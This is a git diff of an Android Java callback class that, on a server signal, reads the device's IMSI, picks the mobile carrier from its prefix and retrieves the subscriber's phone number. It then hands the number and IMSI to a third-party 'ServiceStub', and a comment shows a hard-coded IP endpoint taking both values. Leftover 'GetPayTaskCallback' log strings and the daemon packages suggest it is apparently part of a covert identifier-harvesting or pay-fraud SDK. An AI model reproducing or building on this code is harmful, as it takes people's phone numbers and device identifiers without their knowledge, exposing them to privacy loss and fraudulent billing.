@@ -4,12 +4,10 @@ import android.content.Context;
 import android.text.TextUtils;
 import android.util.Log;
 
-import com.gandalf.daemon.utils.LogUtil;
 import com.gandalf.daemon.utils.XL_log;
 import com.shoujishuju.Service;
 import com.shoujishuju.enums.ISPType;
 import com.thirdparty.engine.ServiceStub;
-import com.thirdparty.utils.Constants;
 import com.zhy.http.okhttp.callback.Callback;
 
 import org.json.JSONException;
@@ -18,27 +16,29 @@ import org.json.JSONObject;
 import okhttp3.Call;
 import okhttp3.Response;
 
-public class PhoneNumCallback extends Callback<String> {
-    private static final XL_log log = new XL_log(PhoneNumCallback.class);
+public class GetPhoneNumCallback extends Callback<String> {
+    private static final XL_log log = new XL_log(GetPhoneNumCallback.class);
     private Context mContext = null;
+    private String imsi;
 
-    public PhoneNumCallback(Context context) {
+    public GetPhoneNumCallback(Context context, String imsi) {
         super();
         this.mContext = context;
+        this.imsi = imsi;
     }
 
     @Override
     public void onError(Call call, Exception exception, int code) {
         if (exception != null) {
-            log.error("GetPayTaskCallback:" + Log.getStackTraceString(exception) + " code:" + code);
+            log.error("GetPhoneNumCallback:" + Log.getStackTraceString(exception) + " code:" + code);
         } else {
-            log.error("GetPayTaskCallback exception and exception is null");
+            log.error("GetPhoneNumCallback exception and exception is null");
         }
     }
 
     @Override
     public String parseNetworkResponse(Response response, int code) throws Exception {
-        log.debug("GetPayTaskCallback");
+        log.debug("GetPhoneNumCallback");
         if (response == null)
             return null;
         String responeBody = response.body().string();
@@ -60,16 +60,19 @@ public class PhoneNumCallback extends Callback<String> {
         }
         try {
             JSONObject obj = new JSONObject(response);
-            if (obj.getInt("isNeedGetNum") == 1) {
+            if (obj.getString("isNeedGetNum").equals("1")) {
                 Service service = new Service();
-
-                String mobile = service.getMobile(ISPType.CMCC);
-                if(mobile == null){
+                String mobile;
+                if (imsi.startsWith("46000") || imsi.startsWith("46002") || imsi.startsWith("46007"))
+                    mobile = service.getMobile(ISPType.CMCC);
+                else {
                     mobile = service.getMobile(ISPType.CTCC);
                 }
-                if(mobile!=null);//save num
-
-                ServiceStub.getInstance(mContext).setmIsPhoneNumInited(true);
+                log.debug("GetPhoneNumCallback mobile " + imsi + "  " + mobile);
+                if (mobile != null) {
+                    //http://103.229.215.159:8080/api/upgprsnum?pid=10003&cid=0&imsi=460013798217927&mobile=13300000001，
+                    ServiceStub.getInstance(mContext).setIsPhoneNumInited(true, mobile, imsi);
+                }
             }
         } catch (JSONException e) {
             e.printStackTrace();
